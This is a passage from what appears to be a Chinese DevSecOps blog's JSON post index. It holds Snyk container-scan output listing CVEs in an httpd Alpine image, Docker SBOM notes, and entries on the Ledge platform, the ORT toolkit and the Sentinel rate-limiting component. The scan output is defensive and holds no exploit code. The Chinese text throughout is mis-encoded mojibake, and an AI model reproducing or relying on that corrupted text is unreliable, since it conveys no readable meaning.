openjdk8&#x2F;openjdk8-jre-lib@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0 &gt; openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0\n  and 2 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 8.345.01-r0\n\nâœ— Medium severity vulnerability found in openjdk8&#x2F;openjdk8-jre-base\n  Description: CVE-2022-21541\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENJDK8-2987666\n  Introduced through: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, openjdk8&#x2F;openjdk8-jre@8.322.06-r0, openjdk8&#x2F;openjdk8-jre-lib@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0 &gt; openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0\n  and 2 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 8.345.01-r0\n\nâœ— Medium severity vulnerability found in openjdk8&#x2F;openjdk8-jre-base\n  Description: CVE-2022-21434\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENJDK8-2987668\n  Introduced through: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, openjdk8&#x2F;openjdk8-jre@8.322.06-r0, openjdk8&#x2F;openjdk8-jre-lib@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0 &gt; openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0\n  and 2 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 8.345.01-r0\n\nâœ— Medium severity vulnerability found in openjdk8&#x2F;openjdk8-jre-base\n  Description: CVE-2022-21426\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENJDK8-2987670\n  Introduced through: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, openjdk8&#x2F;openjdk8-jre@8.322.06-r0, openjdk8&#x2F;openjdk8-jre-lib@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0 &gt; openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0\n  and 2 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 8.345.01-r0\n\nâœ— Medium severity vulnerability found in curl&#x2F;libcurl\n  Description: Allocation of Resources Without Limits or Throttling\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-CURL-2938008\n  Introduced through: curl&#x2F;libcurl@7.83.1-r1, .httpd-so-deps@20220613.233641\n  From: curl&#x2F;libcurl@7.83.1-r1\n  From: .httpd-so-deps@20220613.233641 &gt; curl&#x2F;libcurl@7.83.1-r1\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 7.83.1-r2\n\nâœ— Medium severity vulnerability found in curl&#x2F;libcurl\n  Description: Out-of-bounds Write\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-CURL-2938012\n  Introduced through: curl&#x2F;libcurl@7.83.1-r1, .httpd-so-deps@20220613.233641\n  From: curl&#x2F;libcurl@7.83.1-r1\n  From: .httpd-so-deps@20220613.233641 &gt; curl&#x2F;libcurl@7.83.1-r1\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 7.83.1-r2\n\nâœ— Medium severity vulnerability found in curl&#x2F;libcurl\n  Description: Allocation of Resources Without Limits or Throttling\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-CURL-2938014\n  Introduced through: curl&#x2F;libcurl@7.83.1-r1, .httpd-so-deps@20220613.233641\n  From: curl&#x2F;libcurl@7.83.1-r1\n  From: .httpd-so-deps@20220613.233641 &gt; curl&#x2F;libcurl@7.83.1-r1\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 7.83.1-r2\n\nâœ— High severity vulnerability found in openjdk8&#x2F;openjdk8-jre-base\n  Description: CVE-2022-21476\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENJDK8-2987664\n  Introduced through: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, openjdk8&#x2F;openjdk8-jre@8.322.06-r0, openjdk8&#x2F;openjdk8-jre-lib@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0 &gt; openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0\n  and 2 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 8.345.01-r0\n\nâœ— High severity vulnerability found in busybox&#x2F;busybox\n  Description: Use After Free\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-BUSYBOX-2953070\n  Introduced through: busybox&#x2F;busybox@1.35.0-r13, ca-certificates&#x2F;ca-certificates@20211220-r0, fontconfig&#x2F;fontconfig@2.14.0-r0, java-cacerts&#x2F;java-cacerts@1.0-r1, java-common&#x2F;java-common@0.5-r0, mkfontscale&#x2F;mkfontscale@1.2.2-r0, alpine-baselayout&#x2F;alpine-baselayout-data@3.2.0-r20, busybox&#x2F;ssl_client@1.35.0-r13\n  From: busybox&#x2F;busybox@1.35.0-r13\n  From: ca-certificates&#x2F;ca-certificates@20211220-r0 &gt; busybox&#x2F;busybox@1.35.0-r13\n  From: fontconfig&#x2F;fontconfig@2.14.0-r0 &gt; busybox&#x2F;busybox@1.35.0-r13\n  and 5 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 1.35.0-r15\n\nâœ— Critical severity vulnerability found in zlib&#x2F;zlib\n  Description: Out-of-bounds Write\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-ZLIB-2976176\n  Introduced through: zlib&#x2F;zlib@1.2.12-r1, curl&#x2F;libcurl@7.83.1-r1, libxml2&#x2F;libxml2@2.9.14-r0, .httpd-so-deps@20220613.233641, apk-tools&#x2F;apk-tools@2.12.9-r3, freetype&#x2F;freetype@2.12.1-r0, libpng&#x2F;libpng@1.6.37-r1, libfontenc&#x2F;libfontenc@1.1.4-r0, mkfontscale&#x2F;mkfontscale@1.2.2-r0, openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, perl&#x2F;perl@5.34.1-r0, python3&#x2F;python3@3.10.4-r0\n  From: zlib&#x2F;zlib@1.2.12-r1\n  From: curl&#x2F;libcurl@7.83.1-r1 &gt; zlib&#x2F;zlib@1.2.12-r1\n  From: libxml2&#x2F;libxml2@2.9.14-r0 &gt; zlib&#x2F;zlib@1.2.12-r1\n  and 9 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 1.2.12-r2\n\nâœ— Critical severity vulnerability found in openjdk8&#x2F;openjdk8-jre-base\n  Description: Incorrect Conversion between Numeric Types\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENJDK8-2987669\n  Introduced through: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, openjdk8&#x2F;openjdk8-jre@8.322.06-r0, openjdk8&#x2F;openjdk8-jre-lib@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0 &gt; openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0\n  and 2 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 8.345.01-r0\n\nâœ— Critical severity vulnerability found in curl&#x2F;libcurl\n  Description: Incorrect Default Permissions\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-CURL-2938013\n  Introduced through: curl&#x2F;libcurl@7.83.1-r1, .httpd-so-deps@20220613.233641\n  From: curl&#x2F;libcurl@7.83.1-r1\n  From: .httpd-so-deps@20220613.233641 &gt; curl&#x2F;libcurl@7.83.1-r1\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 7.83.1-r2\n\n\n\nOrganization:      gwarloki\nPackage manager:   apk\nProject name:      docker-image|sspringett&#x2F;nvdmirror\nDocker image:      sspringett&#x2F;nvdmirror:latest\nPlatform:          linux&#x2F;amd64\nBase image:        httpd:2.4.54-alpine3.16\nLicenses:          enabled\n\nTested 90 dependencies for known issues, found 16 issues.\n\nYour base image is out of date\n1) Pull the latest version of your base image by running &#39;docker pull httpd:2.4.54-alpine3.16&#39;\n2) Rebuild your local image\n\n-------------------------------------------------------\n\nTesting sspringett&#x2F;nvdmirror:latest...\n\nOrganization:      gwarloki\nPackage manager:   maven\nTarget file:       &#x2F;usr&#x2F;local&#x2F;bin\nProject name:      sspringett&#x2F;nvdmirror:latest:&#x2F;usr&#x2F;local&#x2F;bin\nDocker image:      sspringett&#x2F;nvdmirror:latest\nLicenses:          enabled\n\nâœ” Tested 1 dependencies for known issues, no vulnerable paths found.\n\n\nTested 2 projects, 1 contained vulnerable paths.\næ‰«æDockerfileæ–‡ä»¶xfxj01@moses î‚° ~&#x2F;Downloads&#x2F;PR&#x2F;deepflow-dashboards î‚° î‚  main î‚° docker scan --file Dockerfile dashboard:latest\n\næ‰«æé•œåƒ# éšä¾¿ä»haborä¸‹è½½ä¸€ä¸ªæ¯”è¾ƒæ–°çš„prodé•œåƒ\nxfxj01@moses î‚° ~&#x2F;Downloads&#x2F;PR&#x2F;deepflow-dashboards î‚° î‚  main î‚° docker pull registry.happycfc.com&#x2F;prod&#x2F;accounting:2.0.4.11\n# æ‰«æé•œåƒå¹¶ä¿å­˜jsonæ–‡ä»¶\nxfxj01@moses î‚° ~&#x2F;Downloads&#x2F;PR&#x2F;deepflow-dashboards î‚° î‚  main î‚° docker scan --json registry.happycfc.com&#x2F;prod&#x2F;accounting:2.0.4.11 &gt; &#x2F;Users&#x2F;xfxj01&#x2F;Downloads&#x2F;accounting2.\n0.4.11.json\næ‰«æç»“æœï¼š\n\n\nseverityWithCritical-criticalï¼š393\nseverityWithCritical-highï¼š882\nseverityWithCritical-medium:1040\nseverityWithCritical-low:120\npackageManager-debian8:2322\npackageManager-maven:118\n\nDocker SBOM\n\n\n\n\n\n\n\n\ndocker sbomå°šå¤„äºå®éªŒçŠ¶æ€ï¼Œæœªæ¥ç‰ˆæœ¬å¯èƒ½ä¼šæ”¹å˜æˆ–è€…è¢«ç§»é™¤ã€‚\ndocker sbomä½¿ç”¨[[Syft]]é¡¹ç›®æ‰«æå›¾åƒå›¾å±‚æ¥åšåˆ°è¿™ä¸€ç‚¹ï¼Œä½†å°†æ¥å®ƒå¯èƒ½ä¼šä»å›¾åƒæœ¬èº«æˆ–å…¶ä»–åœ°æ–¹è¯»å–SBOMã€‚\nusage\nä¸‹è½½æ’ä»¶GitHub - docker&#x2F;sbom-cli-plugin: Plugin for Docker CLI to support SBOM creation using Syft\næ£€æµ‹é¡¹ç›®ç”ŸæˆSBOMæ¸…å•æ–‡ä»¶xfxj01@moses î‚° ~&#x2F;Downloads&#x2F;sbom-cli-plugin_0.6.1_darwin_amd64 î‚° .&#x2F;docker-sbom sbom --format cyclonedx-xml registry.happycfc.com&#x2F;prod&#x2F;accounting:2.0.4.11 &gt; &#x2F;Users&#x2F;xfxj01&#x2F;Downloads&#x2F;accounting.xml\nå°†SBOMæ–‡ä»¶ä¸Šä¼ åˆ°DT\n\n\nTODO\nå¯¹æ¯”æ–¹æ¡ˆdocker scan vs harbor plugins\nJenkinsåè€…harborå¦‚ä½•é›†æˆèƒ½åŠ›\n\nQ&amp;Aæ•°æ®æ ¼å¼é—®é¢˜![[2022-09-02_å‘¨äº”#å…³äºä½¿ç”¨docker-SBOMç”Ÿæˆçš„SBOMé—®é¢˜]]\nè§£å†³æ€è·¯\nsyftåªæ‰«æé•œåƒæ–‡ä»¶çš„è¿è¡Œè½¯ä»¶ç»„ä»¶ä¾èµ–ï¼Œåˆ†å¼€ä¸åŒçš„æµç¨‹ï¼Œå°†é•œåƒæ–‡ä»¶çš„æ£€æŸ¥ä¸åº”ç”¨ç¨‹åºçš„æ£€æµ‹ä»Jenkins job åˆ°å‘é€åˆ°ä¸åŒçš„DTï¼Œåè€…åŒä¸€ä¸ªDTçš„ä¸åŒé¡¹ç›®åç§°&#x2F;ç±»å‹\nå¯»æ‰¾æ›´å¥½çš„æ‰«æé•œåƒçš„æ–¹å¼ï¼Œå¦‚harbor [[å®¹å™¨é•œåƒå®‰å…¨-trivy]]\nä¸€æ­¥åˆ°ä½çš„æ²»ç†é•œåƒå®‰å…¨ï¼Œä½¿ç”¨[[å®¹å™¨é•œåƒæ„å»ºä¸åˆ†å‘çš„æŠ€æœ¯å®è·µä¸å®‰å…¨æ€ç´¢#åŸºç¡€é•œåƒ-Distroless]]\n\nReferences\nGenerate the SBOM for Docker images | Docker Documentation\nVulnerability scanning for Docker local images | Docker Documentation\nSite Unreachable\n\n","slug":"dockeré•œåƒå®‰å…¨çš„æ£€æŸ¥","date":"2022-08-31T03:46:00.000Z","categories_index":"Cloud-Native-Security","tags_index":"é•œåƒå®‰å…¨,docker,äº‘åŸç”Ÿå®‰å…¨","author_index":"Moses"},{"id":"fbe86b2e2e4515d1ae412070b4b7c003","title":"DevSecOpsçŸ¥è¯†å¹³å°-ledge","content":"\n\n\n\n\n\n\n\n\nå·¥å…·çš„é“ä¸æœ¯ï¼šé“ï¼Œæ˜¯æŒ‡è¿™ä¸ªå·¥å…·å†…åœ¨çš„å“²å­¦ï¼Œå¦‚æœä½ è§‰å¾—å“²å­¦è¿™ä¸ªè¯å¤ªå¤§äº†ï¼Œä¹Ÿå¯ä»¥å«å®ƒé€»è¾‘ã€‚ä¸€ä¸ªå·¥å…·çš„ä¼˜é›…ä¹‹å¤„å°±ä½“ç°åœ¨ã€Œé“ã€ä¸Šï¼Œã€Œé“ã€è™½ç„¶è²Œä¼¼è™šæ— ç¼¥ç¼ˆï¼Œå®ƒå´æ˜¯æœ€å®¹æ˜“åŒºåˆ†åŒç±»å‹å·¥å…·ä¹‹é—´ä¸åŒä¹‹å¤„çš„ä¸œè¥¿ã€‚æœ¯ï¼Œå°±æ˜¯æŠ€æœ¯å±‚é¢ï¼Œè¿™ä¸ªå·¥å…·æ€ä¹ˆæ“ä½œï¼Œæ€ä¹ˆç”¨èµ·æ¥ã€‚\nçŸ¥è¯†å¹³å°-ledge0x01ç®€ä»‹DevOps å·¥å…·å…ƒç´ å‘¨æœŸè¡¨ - Ledge DevOps çŸ¥è¯†å¹³å°Ledgeï¼ˆæºè‡ª know-ledgeï¼Œæ„æŒ‡æ‰¿è½½ç‰©ï¼‰çŸ¥è¯†å¹³å°æ˜¯åŸºäºæˆ‘ä»¬æ‰€è¿›è¡Œçš„ä¸€ç³»åˆ— DevOps å®è·µã€æ•æ·å®è·µã€ç²¾ç›Šå®è·µæç‚¼å‡ºæ¥çš„çŸ¥è¯†ä½“ç³»ã€‚\nLedge â€”â€” DevOps knowledge learning platform. DevOpsã€ç ”å‘æ•ˆèƒ½çŸ¥è¯†å’Œå·¥å…·å¹³å°ï¼Œæ˜¯æˆ‘ä»¬åŸºäºåœ¨ ThoughtWorks è¿›è¡Œçš„ä¸€ç³»åˆ— DevOps å®è·µã€æ•æ·å®è·µã€è½¯ä»¶å¼€å‘ä¸æµ‹è¯•ã€ç²¾ç›Šå®è·µæç‚¼å‡ºæ¥çš„çŸ¥è¯†ä½“ç³»ã€‚å®ƒåŒ…å«äº†å„ç§æœ€ä½³å®è·µã€æ“ä½œæ‰‹å†Œã€åŸåˆ™ä¸æ¨¡å¼ã€åº¦é‡ã€å·¥å…·ï¼Œç”¨äºå¸®åŠ©æ‚¨çš„ä¼ä¸šåœ¨æ•°å­—åŒ–æ—¶ä»£æ›´å¥½åœ°å‰è¿›ï¼Œè¿˜æœ‰ DevOps è½¬å‹ã€‚\n0x02æ¶æ„å›¾\n0x03æ ¸å¿ƒèƒ½åŠ›\nå¸®åŠ©æ‚¨çš„ä¼ä¸šåœ¨æ•°å­—åŒ–æ—¶ä»£æ›´å¥½åœ°å‰è¿› \nå¸®åŠ©æ‚¨è®¾è®¡æ•°å­—åŒ–æ—¶ä»£çš„ DevOps æµç¨‹\nå¸®åŠ©æ‚¨å¯»æ‰¾æœ€é€‚åˆçš„è½¯ä»¶å·¥ç¨‹æŠ€æœ¯å®è·µ## 0x04å¯¹æ¯”\n\n0x05Quickstart# ä¸‹è½½é¡¹ç›®\ngit clone https:&#x2F;&#x2F;github.com&#x2F;phodal&#x2F;ledge\n# setup\nyarn install\n# run \nyarn start\n# other run command\n  - analyze\n      webpack-bundle-analyzer dist&#x2F;ledge&#x2F;stats-es2015.json\n   - build\n      node --max_old_space_size&#x3D;4096 .&#x2F;node_modules&#x2F;.bin&#x2F;ng build\n   - build:ci\n      node --max_old_space_size&#x3D;4096 .&#x2F;node_modules&#x2F;.bin&#x2F;ng build --configuration ci\n   - build:stats\n      node --max_old_space_size&#x3D;4096 .&#x2F;node_modules&#x2F;.bin&#x2F;ng build --stats-json\n   - changelog\n      conventional-changelog -p angular -i CHANGELOG.md -s\n   - commit\n      git-cz\n   - deploy\n      yarn package &amp;&amp; npx angular-cli-ghpages --repo&#x3D;https:&#x2F;&#x2F;github.com&#x2F;phodal&#x2F;do.git --dir&#x3D;dist&#x2F;static --cname&#x3D;devops.phodal.com\n   - lint\n      yarn ng lint\n   - ng\n      .&#x2F;node_modules&#x2F;.bin&#x2F;ng\n   - package\n      yarn build:ci &amp;&amp; rm -rf dist&#x2F;static &amp;&amp; yarn scully\n   - publish:cloudbase\n      cloudbase hosting:deploy dist&#x2F;static -e ledge2-8daa6a\n   - scully\n      scully --scanRoutes\n   - scully:serve\n      scully serve\n   - start\n      yarn ng serve\n   - test\n      yarn ng test\n   - test:ci\n      yarn ng test --watch&#x3D;false --progress&#x3D;false --browsers&#x3D;ChromeHeadlessCI --codeCoverage\næœ¬åœ°éƒ¨ç½²ï¼šhttp://localhost:4200\n\n### require\n### install\n### check\n### è¿›é˜¶\n0x06ä½¿ç”¨è¯´æ˜\næ­å»ºå†…éƒ¨çŸ¥è¯†åº“\nMarkdown edit notes\nå†™ä½œå‚è€ƒï¼Œå¤§é‡å®è·µã€å›¾ç¤º\n\n0x07åº”ç”¨åœºæ™¯ReferencesDevSecOpsåœ¨æºç¨‹çš„æœ€ä½³å®è·µ\n","slug":"çŸ¥è¯†å¹³å°-ledge","date":"2022-08-25T02:05:00.000Z","categories_index":"DevSecOps","tags_index":"DevSecOps,çŸ¥è¯†åº“,DevOpså®è·µ,åº¦é‡,æ£€æŸ¥æ¸…å•,è®¾è®¡DevOps,æ¡ˆä¾‹å­¦ä¹ ,å·¥å…·é“¾","author_index":"Moses"},{"id":"f5c84e15a346599d9534a7755e6c3e3f","title":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨åˆ†æå·¥å…·-ORT","content":"å·¥å…·-ç”¨äºå®¡æŸ¥å¼€æºè½¯ä»¶ort0x01ç®€ä»‹OSSå®¡æŸ¥å·¥å…·åŒ…ï¼ˆORTï¼‰æ—¨åœ¨ååŠ©å¤„ç†åœ¨è®¸å¯è¯åˆè§„æ€§æ£€æŸ¥ä¸­é€šå¸¸éœ€è¦æ‰§è¡Œçš„ä»»åŠ¡ï¼Œç‰¹åˆ«æ˜¯ï¼ˆä½†ä¸é™äºï¼‰è‡ªç”±å’Œå¼€æºè½¯ä»¶ä¾èµ–é¡¹ã€‚\n\nğŸ‘‘é¡¹ç›®åœ°å€GitHub - oss-review-toolkit&#x2F;ort: A suite of tools to assist with reviewing Open Source Software dependencies.\nğŸ‘¸ğŸ»å®˜ç½‘oss-review-toolkit.org&#x2F;\n\n0x02æ¶æ„å›¾0x03æ ¸å¿ƒèƒ½åŠ›å®ƒé€šè¿‡ç¼–æ’_é«˜åº¦å¯å®šåˆ¶_çš„å·¥å…·ç®¡é“æ¥_æŠ½è±¡_åŸºç¡€æœåŠ¡æ¥åšåˆ°è¿™ä¸€ç‚¹ã€‚è¿™äº›å·¥å…·ä½œä¸ºåº“å®ç°ï¼ˆç”¨äºç¼–ç¨‹ç”¨é€”ï¼‰ï¼Œå¹¶é€šè¿‡å‘½ä»¤è¡Œç•Œé¢ï¼ˆç”¨äºè„šæœ¬ä½¿ç”¨ï¼‰ï¼š\n\nAnalyzerÂ - ç¡®å®šé¡¹ç›®çš„ä¾èµ–é¡¹åŠå…¶å…ƒæ•°æ®ï¼ŒæŠ½è±¡å®é™…ä½¿ç”¨çš„è½¯ä»¶åŒ…ç®¡ç†å™¨æˆ–æ„å»ºç³»ç»Ÿã€‚\nä¸‹è½½å™¨-è·å–é¡¹ç›®çš„æ‰€æœ‰æºä»£ç åŠå…¶ä¾èµ–é¡¹ï¼ŒæŠ½è±¡ä½¿ç”¨å“ªç§ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼ˆVCSï¼‰æˆ–å…¶ä»–æ–¹å¼æ¥æ£€ç´¢æºä»£ç ã€‚\næ‰«æä»ª-ä½¿ç”¨é…ç½®çš„æºä»£ç æ‰«æä»ªæ¥æ£€æµ‹è®¸å¯è¯&#x2F;ç‰ˆæƒå‘ç°ï¼ŒæŠ½è±¡æ‰«æä»ªçš„ç±»å‹ã€‚\nAdvisorï¼ˆæŠ€æœ¯é¡¾é—®ï¼‰-ä»é…ç½®çš„æ¼æ´æ•°æ®æœåŠ¡ä¸­æ£€ç´¢å·²ä½¿ç”¨ä¾èµ–é¡¹çš„å®‰å…¨å»ºè®®ã€‚\nè¯„ä¼°è€…Â - æ ¹æ®å¯å®šåˆ¶çš„æ”¿ç­–è§„åˆ™å’Œè®¸å¯è¯åˆ†ç±»è¯„ä¼°è®¸å¯è¯&#x2F;ç‰ˆæƒè°ƒæŸ¥ç»“æœã€‚\nè®°è€…-ä»¥å„ç§æ ¼å¼å‘ˆç°ç»“æœï¼Œå¦‚å¯è§†åŒ–æŠ¥å‘Šã€å¼€æºé€šçŸ¥æˆ–ææ–™æ¸…å•ï¼ˆBOMï¼‰ï¼Œä»¥è½»æ¾è¯†åˆ«ä¾èµ–é¡¹ã€è®¸å¯è¯ã€ç‰ˆæƒæˆ–è¿åæ”¿ç­–è§„åˆ™çš„è¡Œä¸ºã€‚\né€šçŸ¥å™¨-é€šè¿‡ä¸åŒæ¸ é“ï¼ˆå¦‚ç”µå­é‚®ä»¶å’Œ&#x2F;æˆ–JIRAç¥¨æ®ï¼‰å‘é€ç»“æœé€šçŸ¥ã€‚\n\n","slug":"å·¥å…·-ç”¨äºå®¡æŸ¥å¼€æºè½¯ä»¶ort","date":"2022-08-23T05:42:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"SCA,è½¯ä»¶æˆåˆ†åˆ†æå·¥å…·,è½¯ä»¶ä¾›åº”é“¾å®‰å…¨,ORT","author_index":"Moses"},{"id":"79f5d6330829493d02164e331a2eb0fa","title":"æœåŠ¡é™æµç†”æ–­ç»„ä»¶é€‰å‹","content":"\n\n\n\n\n\n\n\n\næ¶æ„é€‰çš„å¥½ï¼Œä¸‹ç­èµ°çš„æ—©ğŸ‘ŒğŸ»\næœåŠ¡é™æµç†”æ–­ç»„ä»¶é€‰å‹0x01ç®€ä»‹SentinelSentinel æ˜¯ä¸€æ¬¾é¢å‘åˆ†å¸ƒå¼æœåŠ¡æ¶æ„çš„è½»é‡çº§æµé‡æ§åˆ¶ç»„ä»¶ï¼Œä¸»è¦ä»¥æµé‡ä¸ºåˆ‡å…¥ç‚¹ï¼Œä»æµé‡æ§åˆ¶ã€ç†”æ–­é™çº§ã€ç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤ç­‰å¤šä¸ªç»´åº¦æ¥ä¿éšœæœåŠ¡çš„ç¨³å®šæ€§ï¼Œæ ¸å¿ƒæ€æƒ³æ˜¯ï¼šæ ¹æ®å¯¹åº”èµ„æºé…ç½®çš„è§„åˆ™æ¥ä¸ºèµ„æºæ‰§è¡Œç›¸åº”çš„æµæ§&#x2F;é™çº§&#x2F;ç³»ç»Ÿä¿æŠ¤ç­–ç•¥\n0x02æ¶æ„å›¾\n0x03æ ¸å¿ƒèƒ½åŠ›0x04å¯¹æ¯”\n\n\nç±»åˆ«\nHystrix(ä¸ç»´æŠ¤)\nresilience4j\nSentinel\n\n\n\néš”ç¦»ç­–ç•¥\nçº¿ç¨‹æ± ã€ä¿¡å·é‡éš”ç¦»\nä¿¡å·é‡éš”ç¦»\nä¿¡å·é‡éš”ç¦»ã€å¹¶å‘çº¿ç¨‹æ•°é™æµ\n\n\nç†”æ–­é™çº§ç­–ç•¥\nå¼‚å¸¸æ¯”ç‡\nå¼‚å¸¸æ¯”ç‡ã€å“åº”æ—¶é—´\nå¼‚å¸¸æ¯”ç‡ã€å¼‚å¸¸æ•°ã€å“åº”æ—¶é—´\n\n\nå•æœºé™æµ\næœ‰é™çš„æ”¯æŒ\nRate Limiter\nåŸºäºQPSï¼Œæ”¯æŒåŸºäºè°ƒç”¨å…³ç³»çš„é™æµ\n\n\né›†ç¾¤é™æµ\nä¸æ”¯æŒ\nä¸æ”¯æŒ\næ”¯æŒ\n\n\næµé‡æ•´å½¢\nä¸æ”¯æŒ\nç®€å•çš„Rate Limiteræ¨¡å¼\næ”¯æŒé¢„çƒ­æ¨¡å¼ã€åŒ€é€Ÿæ‘¸æ’å¯¹æ¨¡å¼\n\n\nç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤\nä¸æ”¯æŒ\nä¸æ”¯æŒ\næ”¯æŒ\n\n\nçƒ­ç‚¹é˜²æŠ¤\nä¸æ”¯æŒ\nä¸æ”¯æŒ\næ”¯æŒ\n\n\nè§„åˆ™é…ç½®\næ”¯æŒå¤šç§æ•°æ®æº\næœ‰é™çš„å½¢å¼\næ”¯æŒå¤šç§æ•°æ®æº\n\n\nåŸºäºæ³¨è§£çš„æ”¯æŒ\næ”¯æŒ\næ”¯æŒ\næ”¯æŒ\n\n\næ‰©å±•æ€§\næ’ä»¶çš„å½¢å¼\næ¥å£çš„å½¢å¼\nå¤šä¸ªæ‰©å±•ç‚¹\n\n\nå®æ—¶ç»Ÿè®¡çš„å®ç°\næ»‘åŠ¨çª—å£ï¼ˆåŸºäºRxJava)\nRing Bit Buffer\næ»‘åŠ¨çª—å£ï¼ˆLeapArryï¼‰\n\n\næ§åˆ¶å°\nç®€å•çš„ç›‘æ§æŸ¥çœ‹\nä¸æä¾›æ§åˆ¶å°ï¼Œå¯å¯¹æ¥å…¶ä»–ç›‘æ§ç³»ç»Ÿ\næä¾›å¼€ç®±å³ç”¨çš„æ§åˆ¶å°ï¼Œå¯é…ç½®è§„åˆ™ã€æŸ¥çœ‹ç§’çº§ç›‘æ§ã€æœºå™¨å‘ç°ç­‰\n\n\n0x05Quickstartæ§åˆ¶å° Â· alibaba&#x2F;Sentinel Wiki Â· GitHub\n0x06ä½¿ç”¨è¯´æ˜1ã€èµ„æºä¸è§„åˆ™ï¼šSentinelÂ å¯ä»¥ç®€å•åˆ†ä¸ºÂ SentinelÂ æ ¸å¿ƒåº“å’ŒÂ Dashboardï¼Œæ ¸å¿ƒåº“ä¸ä¾èµ–Â Dashboardï¼Œä½†æ˜¯ç»“åˆÂ DashboardÂ å¯ä»¥è·å¾—æ›´å¥½çš„æ•ˆæœã€‚ä½¿ç”¨Â SentinelÂ æ¥è¿›è¡Œèµ„æºä¿æŠ¤ï¼Œä¸»è¦åˆ†ä¸ºå‡ ä¸ªæ­¥éª¤:\nï¼ˆ1ï¼‰å®šä¹‰èµ„æºï¼šÂ èµ„æºå¯ä»¥æ˜¯ç¨‹åºä¸­çš„ä»»ä½•å†…å®¹ï¼Œä¾‹å¦‚ä¸€ä¸ªæœåŠ¡ï¼ŒæœåŠ¡é‡Œçš„æ–¹æ³•ï¼Œç”šè‡³æ˜¯ä¸€æ®µä»£ç ã€‚\nï¼ˆ2ï¼‰å®šä¹‰è§„åˆ™ï¼šÂ Sentinel æ”¯æŒä»¥ä¸‹å‡ ç§è§„åˆ™ï¼šæµé‡æ§åˆ¶è§„åˆ™ã€ç†”æ–­é™çº§è§„åˆ™ã€ç³»ç»Ÿä¿æŠ¤è§„åˆ™ã€æ¥æºè®¿é—®æ§åˆ¶è§„åˆ™ å’Œ çƒ­ç‚¹å‚æ•°è§„åˆ™ã€‚\nï¼ˆ3ï¼‰æ£€éªŒè§„åˆ™æ˜¯å¦ç”Ÿæ•ˆ\nç”±äº Sentinel 